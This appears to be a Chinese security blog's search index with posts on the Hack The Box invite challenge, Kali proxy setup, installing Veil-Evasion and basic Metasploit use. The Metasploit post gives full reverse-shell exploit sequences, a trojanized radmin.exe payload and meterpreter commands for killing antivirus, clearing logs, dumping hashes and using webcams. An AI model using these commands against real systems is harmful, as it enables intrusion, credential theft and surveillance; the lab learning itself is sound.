<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>HackTheBox注册</title>
    <url>/2020/08/19/hackthebox%E6%B3%A8%E5%86%8C/</url>
    <content><![CDATA[<h2 id="0x00-前言-什么是Hack-The-Box"><a href="#0x00-前言-什么是Hack-The-Box" class="headerlink" title="0x00.前言~什么是Hack The Box"></a>0x00.前言~什么是Hack The Box</h2><blockquote>
<p>它基本上是一个在线平台，用于测试和增强你的渗透测试和网络安全技能。它包含一些不断更新的挑战。其中一些模拟了现实世界的场景，而另一些则更倾向于CTF的挑战风格。如果你对网络安全或信息安全感兴趣，则应尝试此站点。OK让我们开始吧！！！</p>
</blockquote>
<a id="more"></a>

<h2 id="0x01-首先，访问Hack-the-Box网站，并阅读其常见问题解答和一些其他有用的东西。"><a href="#0x01-首先，访问Hack-the-Box网站，并阅读其常见问题解答和一些其他有用的东西。" class="headerlink" title="0x01.首先，访问Hack the Box网站，并阅读其常见问题解答和一些其他有用的东西。"></a>0x01.首先，访问<span class="exturl" data-url="aHR0cHM6Ly93d3cuaGFja3RoZWJveC5ldS8=">Hack the Box网站，<i class="fa fa-external-link-alt"></i></span>并阅读其常见问题解答和一些其他有用的东西。</h2><h2 id="0x02-系统将提示您转到https-www-hackthebox-eu-邀请加入HTB。"><a href="#0x02-系统将提示您转到https-www-hackthebox-eu-邀请加入HTB。" class="headerlink" title="0x02.系统将提示您转到https://www.hackthebox.eu/邀请加入HTB。"></a>0x02.系统将提示您转到<span class="exturl" data-url="aHR0cHM6Ly93d3cuaGFja3RoZWJveC5ldS9pbnZpdGU=">https://www.hackthebox.eu/<i class="fa fa-external-link-alt"></i></span>邀请加入HTB。</h2><h2 id="0x03-当您转到该页面时，将看到一个文本框，让你输入邀请码。"><a href="#0x03-当您转到该页面时，将看到一个文本框，让你输入邀请码。" class="headerlink" title="0x03.当您转到该页面时，将看到一个文本框，让你输入邀请码。"></a>0x03.当您转到该页面时，将看到一个文本框，让你输入<em>邀请码</em>。</h2><h3 id="01-根据提示打开控制台"><a href="#01-根据提示打开控制台" class="headerlink" title="01.根据提示打开控制台"></a>01.根据提示打开控制台</h3><img src="/2020/08/19/hackthebox%E6%B3%A8%E5%86%8C/image-20200819155151668.png" class>

<h3 id="02-根据提示继续"><a href="#02-根据提示继续" class="headerlink" title="02.根据提示继续"></a>02.根据提示继续</h3><p><code>挑战第一步，此页面加载一个有趣的javascript文件。看看你能不能找到它：</code></p>
<img src="/2020/08/19/hackthebox%E6%B3%A8%E5%86%8C/image-20200819155456002.png" class>

<h3 id="03-发现邀请接口的js文件"><a href="#03-发现邀请接口的js文件" class="headerlink" title="03.发现邀请接口的js文件"></a>03.发现邀请接口的js文件</h3><img src="/2020/08/19/hackthebox%E6%B3%A8%E5%86%8C/image-20200819155754688.png" class>

<h3 id="04-右键打开，发现制造邀请码函数"><a href="#04-右键打开，发现制造邀请码函数" class="headerlink" title="04.右键打开，发现制造邀请码函数"></a>04.右键打开，发现制造邀请码函数</h3><img src="/2020/08/19/hackthebox%E6%B3%A8%E5%86%8C/image-20200819155903977.png" class>

<h3 id="05-在控制台调用"><a href="#05-在控制台调用" class="headerlink" title="05.在控制台调用"></a>05.在控制台调用</h3><p><code>可以看到200状态码，可以看到data为加密为ROT13(有时也为base64)</code></p>
<img src="/2020/08/19/hackthebox%E6%B3%A8%E5%86%8C/image-20200819160416212.png" class>

<h3 id="06-解密"><a href="#06-解密" class="headerlink" title="06.解密"></a>06.解密</h3><p><code>发现要发送POST请求</code></p>
<img src="/2020/08/19/hackthebox%E6%B3%A8%E5%86%8C/image-20200819160919218.png" class>

<h3 id="07-发送POST请求"><a href="#07-发送POST请求" class="headerlink" title="07.发送POST请求"></a>07.发送POST请求</h3><p><code>得到以=结尾的数据，猜测为base64</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">SlpYQkMtRkVBWUktWkhWQ1AtRkhTU0gtS0xEVFQ=</span><br></pre></td></tr></table></figure>

<img src="/2020/08/19/hackthebox%E6%B3%A8%E5%86%8C/image-20200819161940343.png" class>

<h3 id="08-解码"><a href="#08-解码" class="headerlink" title="08.解码"></a>08.解码</h3><p><code>得到邀请码</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">JZXBC-FEAYI-ZHVCP-FHSSH-KLDTT</span><br></pre></td></tr></table></figure>

<img src="/2020/08/19/hackthebox%E6%B3%A8%E5%86%8C/image-20200819162456042.png" class>

<h3 id="09-之后就可以愉快的玩耍了"><a href="#09-之后就可以愉快的玩耍了" class="headerlink" title="09.之后就可以愉快的玩耍了"></a>09.之后就可以愉快的玩耍了</h3><p><code>根据提示进行连接即可</code></p>


<p><code>下图为连接成功状态</code></p>

]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>kali设置酸酸乳</title>
    <url>/2020/08/16/kali%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
<p>由于经常需要在vm中使用kali，并且要大量下载国外资源，所以没有一个滋润的代理<br>是不能忍受的！你要佛系当我没说。。。下面来解决一下这个问题</p>
</blockquote>
<a id="more"></a>

<h2 id="浏览器代理"><a href="#浏览器代理" class="headerlink" title="浏览器代理"></a>浏览器代理</h2><h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a><strong>准备工作</strong></h3><blockquote>
<p>有可用的SSR账号，可以选择网上免费分享的账号，或者自己在VPS上搭建。</p>
<p>虚拟机网卡模式为桥接</p>
</blockquote>
<h3 id="下载SSR脚本并安装"><a href="#下载SSR脚本并安装" class="headerlink" title="下载SSR脚本并安装"></a><strong>下载SSR脚本并安装</strong></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://lunamoore.github.io/ssr</span><br><span class="line">mv ssr /usr/<span class="built_in">local</span>/bin</span><br><span class="line">chmod 766 /usr/<span class="built_in">local</span>/bin/ssr</span><br><span class="line">ssr install</span><br><span class="line">ssr config</span><br></pre></td></tr></table></figure>

<h3 id="配置SSR"><a href="#配置SSR" class="headerlink" title="配置SSR"></a><strong>配置SSR</strong></h3><p>一般情况只需要修改以下有注释的地方</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">        <span class="string">&quot;server&quot;</span>: <span class="string">&quot;0.0.0.0&quot;</span>,   //服务器IP地址</span><br><span class="line">        <span class="string">&quot;server_ipv6&quot;</span>: <span class="string">&quot;::&quot;</span>,</span><br><span class="line">        <span class="string">&quot;server_port&quot;</span>: 2333,  //端口</span><br><span class="line">        <span class="string">&quot;local_address&quot;</span>: <span class="string">&quot;127.0.0.1&quot;</span>, </span><br><span class="line">        <span class="string">&quot;local_port&quot;</span>: 1080,</span><br><span class="line"></span><br><span class="line">        <span class="string">&quot;password&quot;</span>: <span class="string">&quot;password&quot;</span>,  //密码</span><br><span class="line">        <span class="string">&quot;method&quot;</span>: <span class="string">&quot;aes-256-cfb&quot;</span>, //加密方式</span><br><span class="line">        <span class="string">&quot;protocol&quot;</span>: <span class="string">&quot;auth_aes128_md5&quot;</span>, //协议</span><br><span class="line">        <span class="string">&quot;protocol_param&quot;</span>: <span class="string">&quot;&quot;</span>,  //协议参数</span><br><span class="line">        <span class="string">&quot;obfs&quot;</span>: <span class="string">&quot;plain&quot;</span>,  //混淆</span><br><span class="line">        <span class="string">&quot;obfs_param&quot;</span>: <span class="string">&quot;&quot;</span>,  //混淆参数</span><br><span class="line">        <span class="string">&quot;speed_limit_per_con&quot;</span>: 0,</span><br><span class="line">        <span class="string">&quot;speed_limit_per_user&quot;</span>: 0,</span><br><span class="line"></span><br><span class="line">        <span class="string">&quot;additional_ports&quot;</span> : &#123;&#125;, </span><br><span class="line">        <span class="string">&quot;additional_ports_only&quot;</span> : <span class="literal">false</span>, </span><br><span class="line">        <span class="string">&quot;timeout&quot;</span>: 120,</span><br><span class="line">        <span class="string">&quot;udp_timeout&quot;</span>: 60,</span><br><span class="line">        <span class="string">&quot;dns_ipv6&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="string">&quot;connect_verbose_info&quot;</span>: 0,</span><br><span class="line">        <span class="string">&quot;redirect&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;fast_open&quot;</span>: <span class="literal">false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="配置代理"><a href="#配置代理" class="headerlink" title="配置代理"></a><strong>配置代理</strong></h3><ul>
<li>以Firefox为例，Chrome上设置类似。</li>
<li>在应用商店找到插件 <code>Proxy SwitchyOmega</code>，添加至Chrome</li>
<li>点击 图标 &gt;&gt; 选项 &gt;&gt; (左边)新建情景模式 ,选第一项 <code>代理服务器</code></li>
</ul>
<img src="/2020/08/16/kali%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86/image-20200814192051948.png" class>

<h3 id="设置开机启动"><a href="#设置开机启动" class="headerlink" title="设置开机启动"></a><strong>设置开机启动</strong></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /etc/init.d</span><br><span class="line">touch ssr</span><br><span class="line">chmod +x ssr</span><br><span class="line">vim ssr</span><br></pre></td></tr></table></figure>

<p>其中ssr的内容为</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### BEGIN INIT INFO</span></span><br><span class="line"><span class="comment"># Provides: ssr    // 程序名，唯一。</span></span><br><span class="line"><span class="comment"># Required-Start: $network $remote_fs $local_fs</span></span><br><span class="line"><span class="comment"># Required-Stop: $network $remote_fs $local_fs</span></span><br><span class="line"><span class="comment"># Default-Start: 2 3 4 5</span></span><br><span class="line"><span class="comment"># Default-Stop: 0 1 6</span></span><br><span class="line"><span class="comment"># Short-Description: ssr    // 启动项的简短说明，随心写。</span></span><br><span class="line"><span class="comment"># Description: shadowsocksR    // 启动项的完整说明，随心写。</span></span><br><span class="line"><span class="comment">### END INIT INFO</span></span><br><span class="line"></span><br><span class="line">nohup ssr start &gt;/dev/null 2&gt;&amp;1 &amp; </span><br><span class="line"></span><br><span class="line"><span class="built_in">exit</span> 0</span><br></pre></td></tr></table></figure>

<p>设置为开机自启</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">update-rc.d ssr defaults</span><br></pre></td></tr></table></figure>

<p>删除开机启动</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">update-rc.d -f ssr remove</span><br></pre></td></tr></table></figure>

<p>开机手动开启或关闭</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssr start</span><br><span class="line">ssr stop</span><br><span class="line">ssr uninstall  //卸载</span><br></pre></td></tr></table></figure>

<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a><strong>测试</strong></h3><img src="/2020/08/16/kali%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86/image-20200814193445301.png" class>


<h2 id="终端命令行代理"><a href="#终端命令行代理" class="headerlink" title="终端命令行代理"></a>终端命令行代理</h2><h3 id="使用proxychains"><a href="#使用proxychains" class="headerlink" title="使用proxychains"></a>使用proxychains</h3><p><code>proxychains</code>终端命令行代理神器，科学上网，内网穿透渗透必备</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/proxychains.conf</span><br></pre></td></tr></table></figure>

<p>编辑配置文件，某尾修改自己的socks5本地代理地址很端口。</p>
<img src="/2020/08/16/kali%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86/image-20200814195018483.png" class>

<h3 id="测试-1"><a href="#测试-1" class="headerlink" title="测试"></a>测试</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">proxychains curl https://www.google.com</span><br></pre></td></tr></table></figure>

<img src="/2020/08/16/kali%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86/image-20200814195221075.png" class>

<h3 id="使用privoxy"><a href="#使用privoxy" class="headerlink" title="使用privoxy"></a>使用privoxy</h3><p>使用Privoxy实现，此方法只有临时生效</p>
<p>首先安装privoxy</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt install -y privoxy</span><br></pre></td></tr></table></figure>

<p>本次使用全局模式。全局模式，将所有http/https请求走代理服务。</p>
<p>1.添加本地ssr服务到配置文件</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;forward-socks5 / 127.0.0.1:1080 .&#x27;</span> &gt;&gt; /etc/privoxy/config</span><br></pre></td></tr></table></figure>

<p>2.Privoxy 默认监听端口是是8118，每次使用都需要添加如下命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> http_proxy=http://127.0.0.1:8118</span><br><span class="line"><span class="built_in">export</span> https_proxy=http://127.0.0.1:8118</span><br><span class="line"><span class="built_in">export</span> no_proxy=localhost</span><br></pre></td></tr></table></figure>

<p>3.启动服务</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl start privoxy.service</span><br><span class="line">systemctl <span class="built_in">enable</span> privoxy.service</span><br></pre></td></tr></table></figure>

<p>no_proxy是不经过privoxy代理的地址<br>只能填写具体的ip、域名后缀，多个条目之间使用’,’逗号隔开<br>比如: export no_proxy=”localhost, 192.168.1.1, ip.cn, chinaz.com”<br>访问 localhost、192.168.1.1、ip.cn、*.ip.cn、chinaz.com、*.chinaz.com 将不使用代理</p>
</blockquote>
<p>查看出口配置</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span></span><br></pre></td></tr></table></figure>

<img src="/2020/08/16/kali%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86/image-20200815140327118.png" class>

<h3 id="测试-2"><a href="#测试-2" class="headerlink" title="测试"></a>测试</h3><p>出现网页源码则为成功</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -sL facebook.com</span><br><span class="line">curl -sL www.baidu.com</span><br><span class="line">curl -sL www.google.com</span><br></pre></td></tr></table></figure>

<img src="/2020/08/16/kali%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86/image-20200815140200323.png" class>



]]></content>
      <categories>
        <category>kali</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Veil-Evasion安装</title>
    <url>/2020/08/18/veil-evasion%E5%AE%89%E8%A3%85/</url>
    <content><![CDATA[<h2 id="Veil-Evasion简介"><a href="#Veil-Evasion简介" class="headerlink" title="Veil-Evasion简介"></a><span class="exturl" data-url="aHR0cHM6Ly93d3cudmVpbC1mcmFtZXdvcmsuY29tLw==">Veil-Evasion<i class="fa fa-external-link-alt"></i></span>简介</h2><blockquote>
<p>Veil-Evasion是一种免杀工具，用于生成绕过常见AV的metasploit payload。</p>
<p>Veil-Evasion被原生设计在kali上，,但kali2020已经需要独立安装。其实存在python环境的系统上应该都能运行。你可以用命令行轻松调用Veil-Evasion，按菜单选项生成payload。在创建payload的时候，Veil-Evasion会询问你是否想把<strong>payload文件用Pyinstaller或者Py2Exe转为可执行文件。</strong></p>
</blockquote>
<p><strong>免责声明：本文只为学习记录，任何人非法使用产生的任何后果，作者概不负责！！！</strong></p>
<a id="more"></a>

<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h3 id="首先更新系统，本次系统为2020-3"><a href="#首先更新系统，本次系统为2020-3" class="headerlink" title="首先更新系统，本次系统为2020.3"></a>首先更新系统，本次系统为2020.3</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get update        //更新所有软件包的列表</span><br><span class="line">apt-get upgrade        //更新所有软件</span><br></pre></td></tr></table></figure>

<h3 id="查看系统详情"><a href="#查看系统详情" class="headerlink" title="查看系统详情"></a>查看系统详情</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~<span class="comment"># lsb_release -a</span></span><br><span class="line">No LSB modules are available.</span><br><span class="line">Distributor ID: Kali</span><br><span class="line">Description:    Kali GNU/Linux Rolling</span><br><span class="line">Release:        2020.3</span><br><span class="line">Codename:       kali-rolling</span><br><span class="line">root@JIYE:~<span class="comment"># </span></span><br></pre></td></tr></table></figure>

<h3 id="配置clone加速，需要配置代理。"><a href="#配置clone加速，需要配置代理。" class="headerlink" title="配置clone加速，需要配置代理。"></a>配置clone加速，需要配置代理。</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config --global http.proxy <span class="string">&#x27;socks5://127.0.0.1:1080&#x27;</span> </span><br><span class="line">git config --global https.proxy <span class="string">&#x27;socks5://127.0.0.1:1080&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="安装veil"><a href="#安装veil" class="headerlink" title="安装veil"></a>安装veil</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get install veil-evasion</span><br><span class="line">veil</span><br></pre></td></tr></table></figure>

<p><code>由于需要运行windows下的程序，所以需要安装windows系统下的程序</code></p>
<p><strong><code>默认安装即可</code></strong></p>
<img src="/2020/08/18/veil-evasion%E5%AE%89%E8%A3%85/image-20200814203354313.png" class>

<img src="/2020/08/18/veil-evasion%E5%AE%89%E8%A3%85/image-20200814203452010.png" class>

<p><strong><code>其他安装略</code></strong></p>
<h3 id="安装可能会出现错误（我的错误如下），执行以下操作"><a href="#安装可能会出现错误（我的错误如下），执行以下操作" class="headerlink" title="安装可能会出现错误（我的错误如下），执行以下操作"></a><strong>安装可能会出现错误（我的错误如下），执行以下操作</strong></h3><blockquote>
<p><strong>错误如下，按提示执行命令即可</strong></p>
<p>[I] If you have any errors running Veil, run: <strong>‘./Veil.py –setup’</strong> and select the nuke the wine folder option</p>
<p>[I] Done!</p>
<p>[!] ERROR #2-3: Can’t find the WINE profile for AuotIT v3 (/var/lib/veil/wine//drive_c/Program Files/AutoIt3/Aut2Exe/Aut2exe.exe).   Run:<strong>/usr/share/veil/config/setup.sh –force –silent</strong></p>
<p>root@JIYE:~# Could not find Wine Gecko. HTML rendering will be disabled.<br>004a:err:mshtml:create_document_object Failed to init Gecko, returning CLASS_E_CLASSNOTAVAILABLE</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /usr/share/veil/ &amp;&amp;./Veil.py --<span class="built_in">set</span> up</span><br><span class="line">/usr/share/veil/config/setup.sh --force --silent</span><br></pre></td></tr></table></figure>

<h2 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h2><img src="/2020/08/18/veil-evasion%E5%AE%89%E8%A3%85/image-20200815151937202.png" class>

<h2 id="日后再写使用方式。。。佛系佛系"><a href="#日后再写使用方式。。。佛系佛系" class="headerlink" title="日后再写使用方式。。。佛系佛系"></a>日后再写使用方式。。。佛系佛系</h2>]]></content>
      <categories>
        <category>kali</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>security tools</tag>
      </tags>
  </entry>
  <entry>
    <title>MSF的简单操作</title>
    <url>/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/</url>
    <content><![CDATA[<h1 id="0x01-写在前面"><a href="#0x01-写在前面" class="headerlink" title="0x01.写在前面"></a>0x01.写在前面</h1><blockquote>
<p><strong>Metasploit项目</strong>是一个旨在提供安全漏洞信息计算机安全项目，可以协助安全工程师进行渗透测试及入侵检测系统]签名开发。metspolit框架共有四个版本（Metasploit Framework Edition，Metasploit Community Edition，Metasploit Express，Metasploit Pro），MSF为其中的开源免费版本，其他为收费版本，但功能也更加强大。最新的MSF为MSF5.0，5.0提供了新的数据服务，引入了新的免杀功能，支持多种语言。</p>
</blockquote>
<p><strong>免责声明：本文只为学习记录，任何人非法使用产生的任何后果，作者概不负责！！！</strong></p>
<a id="more"></a>

<h2 id="一、MSF5的7大模块"><a href="#一、MSF5的7大模块" class="headerlink" title="一、MSF5的7大模块"></a>一、MSF5的7大模块</h2><hr>
<h3 id="1-auxiliary"><a href="#1-auxiliary" class="headerlink" title="1.auxiliary"></a>1.auxiliary</h3><blockquote>
<p>负责执行信息收集、扫描、嗅探、指纹识别、口令猜测和Dos攻击等功能的辅助模块</p>
</blockquote>
<h3 id="2-exploits"><a href="#2-exploits" class="headerlink" title="2.exploits"></a>2.exploits</h3><blockquote>
<p>利用系统漏洞进行攻击的动作，此模块对应每一个具体漏洞的攻击方法（主动、被动） </p>
</blockquote>
<h3 id="3-payloads"><a href="#3-payloads" class="headerlink" title="3.payloads"></a>3.payloads</h3><blockquote>
<p>成功exploit之后，真正在目标系统执行的代码或指令。分为3种类型的payload，分别是single、stages和stagers。shellcode是特殊的payload，用于拿shell。</p>
<p>single：一个完整的payload，不需要外部库，all-in-one</p>
<p>stager：目标计算机内存有限，先传输一个较小的payload用于建立连接</p>
<p>stages：利用stager建立的连接下载后续的payload</p>
<p>stager与stages有多种类型，适用于不同场景</p>
</blockquote>
<h3 id="4-encoders"><a href="#4-encoders" class="headerlink" title="4.encoders"></a>4.encoders</h3><blockquote>
<p>对payload进行加密，躲避Anti Virus检查的模块</p>
</blockquote>
<h3 id="5-nops"><a href="#5-nops" class="headerlink" title="5.nops"></a>5.nops</h3><blockquote>
<p>提高payload稳定性及维持大小。在渗透攻击构造恶意数据缓冲区时，常常要在真正要执行的Shellcode之前添加一段空指令区， 这样当触发渗透攻击后跳转执行Shellcode时，有一个较大的安全着陆区，从而避免受到内存地址随机化、返回地址计算偏差等原因造成的Shellcode执行失败，提高渗透攻击的可靠性。</p>
</blockquote>
<h3 id="6-post"><a href="#6-post" class="headerlink" title="6.post"></a>6.post</h3><blockquote>
<p>后期渗透模块。在取得目标系统远程控制权后，进行一系列的后渗透攻击动作，如获取敏感信息、跳板攻击等操作 </p>
</blockquote>
<h3 id="7-evasion"><a href="#7-evasion" class="headerlink" title="7.evasion"></a>7.evasion</h3><blockquote>
<p>用于免杀绕过</p>
</blockquote>
<h2 id="二、msfconsole控制台"><a href="#二、msfconsole控制台" class="headerlink" title="二、msfconsole控制台"></a>二、msfconsole控制台</h2><p>一般参数</p>
<blockquote>
<p>msfconsole -h    查看帮助信息</p>
<p>msfconsole -q    安静启动</p>
</blockquote>
<p>一般命令</p>
<blockquote>
<p>banner    banner信息</p>
<p>color    颜色设置</p>
<p>connect    连接设置</p>
</blockquote>
<p>控制台常用命令</p>
<blockquote>
<p>show 模块    查看模块信息</p>
<p>search 参数    查找指定信息。例如：search name:mysql</p>
<p>use 指定文件    使用指定文件。例如：use exploit/windows/smb/ms08_067_netapi</p>
<p>在use下可以查看info信息，查看当前exp下可以使用的payload、系统等信息。</p>
<p>在use下也可以使用show missing查看需要配置的参数，show options查看配置的参数，show targets查看可以利用的对象，show advanced查看高级配置参数，show evasion查看面纱绕过信息</p>
<p>set/unset    用于设置</p>
<p>setg/unsetg    全局设置，仅在当前会话有效，退出失效，可以使用save保存</p>
<p>check    用于测试是否可以利用</p>
<p>back    返回上一级</p>
<p>db_    一系列参数</p>
<p>hosts    查看主机参数</p>
<p>hosts -c    查看指定列</p>
<p>hosts -S    以指定参数搜索</p>
<p>services    查看端口等（-S/-c）</p>
<p>run    执行当前模块</p>
<p>load    导入外部模块</p>
<p>resource    指定资源文件    文件名.rc，将配置直接写入.rc，msfconsole -r 文件名.rc</p>
</blockquote>
<p>一个反弹shell小案例，本次利用ms08_067</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">use exploit/windows/smb/ms08_067_netapi</span><br><span class="line">show options</span><br><span class="line">set payload windows/shell/reverse_tcp</span><br><span class="line">set rhost 192.168.1.200</span><br><span class="line">set lhost 192.168.1.6</span><br><span class="line">set target 34</span><br><span class="line">run -j</span><br><span class="line">sessions -l</span><br><span class="line">sessions -i 1</span><br></pre></td></tr></table></figure>

<img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200626115208454.png" class>

<h2 id="三、实验案例"><a href="#三、实验案例" class="headerlink" title="三、实验案例"></a>三、实验案例</h2><h3 id="1-active-exploit与PassiveMoudle案例"><a href="#1-active-exploit与PassiveMoudle案例" class="headerlink" title="(1)active exploit与PassiveMoudle案例"></a>(1)active exploit与PassiveMoudle案例</h3><p>ActiveModule</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">search smb/psexec</span><br><span class="line">use exploit/windows/smb/psexec</span><br><span class="line">search shell/reverse</span><br><span class="line">set payload payload/windows/shell/reverse_tcp</span><br><span class="line">set rhosts 192.168.1.100</span><br><span class="line">set lhost 192.168.1.6</span><br><span class="line">set SMBUSER administrator</span><br><span class="line">set SMBPASS 11</span><br><span class="line">show options</span><br><span class="line">show targets</span><br><span class="line">run -j</span><br><span class="line">sessions -l</span><br><span class="line">sessions -i 1</span><br></pre></td></tr></table></figure>

<p>PassiveMoudle</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">search windows/browser/ms07_017_ani_loadimage_chunksize</span><br><span class="line">use windows/browser/ms07_017_ani_loadimage_chunksize</span><br><span class="line">set payload payload/windows/shell/reverse_tcp</span><br><span class="line">set lhost 192.168.1.6</span><br><span class="line">set srvhost 192.168.1.6</span><br><span class="line">run # 等待访问即可</span><br></pre></td></tr></table></figure>

<h3 id="（2）生成payload案例"><a href="#（2）生成payload案例" class="headerlink" title="（2）生成payload案例"></a>（2）生成payload案例</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">use windows/shell_bind_tcp</span><br><span class="line">generate # 编码</span><br><span class="line">generate -b &#x27;\x00&#x27; # 过滤坏字符</span><br><span class="line">-e x86/shikata_ga_nai # 指定编码</span><br><span class="line">-i 5 # 指定编码次数</span><br><span class="line">-k # 使用当前进程，开启一个新的线程</span><br><span class="line">-x /usr/share/windows-binaries/radmin.exe # 使用一个正常的模板</span><br><span class="line">-f exe # 输出指定格式文件</span><br><span class="line">-o /root/1.exe # 输出文件的名字</span><br><span class="line">-n 14 # 添加14个字节的NOP,NOP是无任何操作字符，可以起到混淆绕过免杀的作用</span><br></pre></td></tr></table></figure>

<p>小案例，生成一个伪造的远程管理小程序</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">generate -b &#x27;\x00\xff&#x27; -e x86/shikata_ga_nai -i 5 -k -x /usr/share/windows-binaries/radmin.exe -f exe -o /root/1.exe</span><br></pre></td></tr></table></figure>

<p>执行</p>
<img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200624191334844.png" class>

<p>nc，getshell</p>
<img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200624191426746.png" class>

<h2 id="四、meterpreter，注入到合法的操作系统里的进程，随机。"><a href="#四、meterpreter，注入到合法的操作系统里的进程，随机。" class="headerlink" title="四、meterpreter，注入到合法的操作系统里的进程，随机。"></a>四、meterpreter，注入到合法的操作系统里的进程，随机。</h2><p>1.meterpreter shell 案例</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">search ms08_067</span><br><span class="line">use exploit/windows/smb/ms08_067_netapi</span><br><span class="line">show options</span><br><span class="line">set rhosts 192.168.1.200</span><br><span class="line">set target 34</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.1.6</span><br><span class="line">run -j</span><br><span class="line">sessions -l</span><br><span class="line">sessions 1</span><br></pre></td></tr></table></figure>

<p>拿到meterpreter shell</p>
<img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200626133358053.png" class>

<p>2.meterpreter shell下的常用命令，在meterpreter shell下可以使用Linux命令与Windows命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">help # 帮助</span><br><span class="line">background # 返回msfconlse，并保存session</span><br><span class="line">dir,pwd,cat,ls,mkdir,rmdir, edit,lcd,lpwd等</span><br><span class="line">bgrun killav # 杀死杀病毒软件</span><br><span class="line">bgrun vnc # 监控</span><br><span class="line">clearev # 清除日志</span><br><span class="line">download # 下载文件 download boot.ini</span><br><span class="line">upload # 上传 例如：upload /usr/share/windows-binaries/nc.exe c:</span><br><span class="line">execute # 执行 例如：execute -f cmd.exe -i -H -f为运行哪个程序 -i为交互 -H为隐藏</span><br><span class="line">getuid # 查看当前用户</span><br><span class="line">getsystem # 提权到system</span><br><span class="line">getprivs # 查看有哪些权限</span><br><span class="line">getproxy # 获取代理</span><br><span class="line">getpid # 获取进程号</span><br><span class="line">migrate 1548 # 迁移进程</span><br><span class="line">hashdump # 获取用户的哈希值</span><br><span class="line">sysinfo # 查看系统信息</span><br><span class="line">reboot</span><br><span class="line">shutdown</span><br><span class="line">shell # 获取shell</span><br><span class="line">show_mount # 查看挂载硬盘</span><br><span class="line">search -f ein.ini # 查找文件</span><br><span class="line">arp</span><br><span class="line">netstat</span><br><span class="line">ipcofnig</span><br><span class="line">ifconfig</span><br><span class="line">route</span><br><span class="line">idletime # 查看停止操作的时间</span><br><span class="line">resource -r 文件 # 调用资源文件</span><br><span class="line">record_mic # 麦克风</span><br><span class="line">webcam_list # 摄像头</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="五、-msfcli"><a href="#五、-msfcli" class="headerlink" title="五、 msfcli"></a>五、 msfcli</h2><p>已被msfconsole -x代替，不好玩</p>
<p>例子：</p>
